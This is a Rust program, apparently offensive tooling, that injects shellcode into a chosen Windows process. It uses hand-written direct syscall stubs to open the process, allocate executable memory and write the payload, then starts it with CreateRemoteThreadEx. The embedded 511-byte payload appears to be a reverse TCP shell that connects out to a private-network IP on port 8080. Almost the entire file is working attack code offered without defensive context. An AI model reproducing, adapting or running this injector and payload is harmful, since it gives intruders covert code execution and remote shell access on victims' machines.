#![allow(unused_mut, unused_assignments)]
use std::ops::Deref;
use std::os::raw::c_void;
use std::env;
use std::ptr::null_mut;
use core::arch::global_asm;
use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{
        Foundation::{CloseHandle, FWP_E_NULL_POINTER, HANDLE, HWND, NTSTATUS},
        System::{
            ProcessStatus::EnumProcesses,
            Threading::{CreateRemoteThreadEx, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE, PROCESS_ACCESS_RIGHTS},
            WindowsProgramming::CLIENT_ID,
        },
    }
};


// Types to make translating windows API types to rust.
type PVoid     = *mut c_void;      // C void*
type CCvoid    = *const c_void;   // C const void*
type PUsize    = *mut usize;      // C's PSIZE 

struct SafeHandle(HANDLE);

impl Deref for SafeHandle {
    type Target = HANDLE;
    fn deref (&self) -> &Self::Target { 
        &self.0
    }
}
impl Drop for SafeHandle {
    fn drop(&mut self) {
        unsafe { 
            match CloseHandle(self.0) { 
                Ok(_) => println!("[+] Closed handle."),
                Err(e) => eprintln!("[!] Error closing handle\n-> {}", e),
            }
        }
    }
}

// Syscalls.
global_asm!("
    zw_read_virtual_memory:
        mov r10, rcx
        mov eax, 0x3F
        syscall
        ret
    nt_write_virtual_memory:
        mov r10, rcx
        mov eax, 0x3A
        syscall
        ret
    zw_allocate_virtual_memory:
        mov r10, rcx
        mov eax, 0x18
        syscall
        ret
    nt_open_process:
        mov r10, rcx
        mov eax, 0x26
        syscall
        ret
");

extern "C" {   
    fn zw_read_virtual_memory(
        process_handle: HANDLE,             // [in] Handle   
        base_address: CCvoid,               // [in] Where to start reading
        buffer_ptr: CCvoid,                 // [out] ptr to buffer to read to
        buffer_size: usize,                 // [in] buffer size
        bytes_read: *mut usize              // [out] returns read size.
    ) -> NTSTATUS;

    fn nt_write_virtual_memory(    
        process_handle: HANDLE,             // [in] Handle   
        base_address: CCvoid,               // [in] Where to start writing
        buffer_ptr: CCvoid,                 // [in] ptr to buffer to write from
        buffer_size:  usize,                // [in] buffer size (write size)
        bytes_written: *mut usize           // [out] returns size of write
    ) -> NTSTATUS;
    
    fn zw_allocate_virtual_memory(
        process_handle: HANDLE,             // [in] Handle
        base_address: *mut PVoid,           // [in, out] Where to allocate space (empty for OS chosen)
        zero_bits: usize,                   // [in] ??
        region_size: PUsize,                // [in, out] How big of a region to allocate.
        allocation_type: usize,             // [in] Commit, reserve, etc.
        protection_flags: usize,            // [in] Type, R / W / X
    ) -> NTSTATUS;

    fn nt_open_process(
        process_handle_ptr: *mut HANDLE,    // [out] Pointer to a handle struct
        access_mask: PROCESS_ACCESS_RIGHTS, // [in] Access mask, ex: PROCESS_ALL_ACCESS 
        oa_ptr: OBJECT_ATTRIBUTES,          // [in] Object attributes pointer
        client_id_ptr: CLIENT_ID,           // [in] ClientId
    ) -> NTSTATUS;

}

fn enumerate_processes() -> Result<Vec<usize>, windows::core::Error> {
    let mut pids = vec![0u32; 1024];
    let mut bytes_returned = 0u32;
    const SIZE_OF_U32: usize = std::mem::size_of::<u32>();
    unsafe {
        EnumProcesses(
            pids.as_mut_ptr(),
            (pids.len() * SIZE_OF_U32) as u32,
            &mut bytes_returned,
        )?;
    }
    // Let's empty out the pids.
    pids.resize(bytes_returned as usize / SIZE_OF_U32, 0);
    let pids_usize = pids.iter().map(|x| *x as usize).collect();
    Ok(pids_usize)
}

fn nt_write_process_memory(handle: HANDLE, address: usize, mut data: Vec<u8>) -> Result<(), NTSTATUS> { 
    let base_address:       CCvoid = address as CCvoid;
    let buffer_ptr:         CCvoid = data.as_mut_ptr() as *mut c_void;
    let mut bytes_written:  usize = 0; 
    let mut written_ptr:    PUsize = &mut bytes_written as PUsize;
    println!("[-] Running WPM.");
    unsafe { 
        let status = nt_write_virtual_memory(
            handle, 
            base_address, 
            buffer_ptr, 
            data.len(), 
            written_ptr
        ); 
        if status.is_ok() { 
            println!("[+] WPM Succeeded.\n-> Wrote {}", bytes_written);
            return Ok(());
        }
        eprintln!("[!] WPM Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }
}

fn nt_read_process_memory(handle: HANDLE, address: usize, amount_to_read: usize) -> Result<Vec<u8>, NTSTATUS> { 
    let base_address:   CCvoid = address as CCvoid;
    let mut buffer:     Vec<u8>= vec![0u8; amount_to_read]; 
    let buffer_ptr:     CCvoid = buffer.as_mut_ptr() as PVoid;
    let mut bytes_read: usize  = 0;
    let mut read_ptr:   PUsize = &mut bytes_read as PUsize;
    println!("[-] Running RPM.");
    unsafe { 
        let status = zw_read_virtual_memory(
            handle, 
            base_address, 
            buffer_ptr, 
            amount_to_read, 
            read_ptr
        );
        if status.is_ok() { 
            println!("[+] RPM Succeeded.\n-> Read {}", bytes_read);
            return Ok(buffer);
        }
        eprintln!("[!] RPM Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }
}

fn nt_virtual_alloc(handle: HANDLE, address: Option<usize>, protection_flags: Option<usize>, size: Option<usize>) -> Result<PVoid, NTSTATUS> {
    let mut base_address:   PVoid = match address { 
        Some(number)    => number as PVoid,
        None                   => null_mut(),
    };
    let zero_bits:          usize = 0;
    let mut region_size:    usize = match size { 
        Some(size)  =>  size,
        None               =>  4096
    };
    let allocation_type:    usize = 0x00001000; 
    let protection_flags:   usize = match protection_flags{ 
        Some(flags) => flags,    
        None        => 0x00000004, // PAGE_READWRITE
    };
    println!("[-] Running VirtualAlloc.");
    unsafe { 
        // Let's try ZwAllocateVirtualMemory
        let status = zw_allocate_virtual_memory(
            handle,
            &mut base_address,
            zero_bits,
            &mut region_size,
            allocation_type,
            protection_flags,
        );
        if status.is_ok() { 
            println!("[+] VirtualAlloc Succeeded.\n-> {:#x} - {:#x}",  base_address as usize, base_address as usize + region_size);
            return Ok(base_address);
        }
        eprintln!("[!] VirtualAlloc Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);

    }
}

fn nt_get_handle(pid: usize) -> Result<SafeHandle, NTSTATUS> {
    let mut handle = HANDLE::default();
    let mut handle_ptr = &mut handle as *mut HANDLE;
    let desired_access = PROCESS_ACCESS_RIGHTS(0xFFFF); //0x0010 | 0x0020 | 0x0008 | 0x0400 <- Correct flags, at the moment, we are using debug flags.
    let oa = OBJECT_ATTRIBUTES::default();
    let client_id: CLIENT_ID = CLIENT_ID{
        UniqueProcess: HANDLE::from(HWND(pid as isize)),
        UniqueThread: HANDLE::default()
    };

    unsafe { 
        let status = nt_open_process(
            handle_ptr,
            desired_access,
            oa,
            client_id,
        );
        if status.is_ok() { 
            println!("[+] OpenProcess Succeeded.\n-> Returned handle <{:?}>", handle.0);
            return Ok(SafeHandle(handle));
        }
        eprintln!("[!] OpenProcess Failed!\n-> NTSTATUS: {:#x}", status.0);
        return Err(status);
    }

}

fn create_thread_ex(handle: HANDLE, address: usize) {
    
    type RemoteThreadProc = unsafe extern "system" fn(CCvoid) -> u32;
    let lpthread_start_routine = LPTHREAD_START_ROUTINE::Some(unsafe { std::mem::transmute(address as *mut std::ffi::c_void) });
    let null = LPPROC_THREAD_ATTRIBUTE_LIST(null_mut());
    unsafe {
        let _m = CreateRemoteThreadEx(
            handle,
            None,
            0,
            lpthread_start_routine,
            None,
            0x0,
            null,
            None,
        );

    } 
}

fn main() {
    let payload: [u8; 511] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,
    0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
    0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,
    0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,
    0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,
    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
    0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
    0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,0x59,
    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,
    0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,
    0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,
    0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x90,0xc0,
    0xa8,0x56,0x19,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
    0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,
    0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,
    0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,
    0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,
    0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,
    0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,
    0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,
    0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,
    0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
    0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,
    0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,
    0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,
    0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,
    0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
    0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,
    0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,
    0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,
    0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,
    0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,
    0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5
    ];
    
    let current_process_pid = enumerate_processes().unwrap();
    let args: Vec<String> = env::args().collect();
    //let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
    let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
    // Let's allocate the required memory:
    let addr_space = nt_virtual_alloc(*current_process_handle, None, Some(0x40), Some(payload.len())).unwrap();
    // Let's write the buffer:
    nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());

    create_thread_ex(*current_process_handle, addr_space as usize); 
    /*
    let variable_to_read = 100u8;
    let variable_location = &variable_to_read as *const _ as *const c_void;
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
    nt_write_process_memory(*current_process_handle, variable_location as usize, vec![64u8]);
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);

    
    let addr_space = nt_virtual_alloc(*current_process_handle, None, None).unwrap();
    nt_virtual_alloc(*current_process_handle, Some(addr_space as usize), Some(0x20)); 
     */    
}
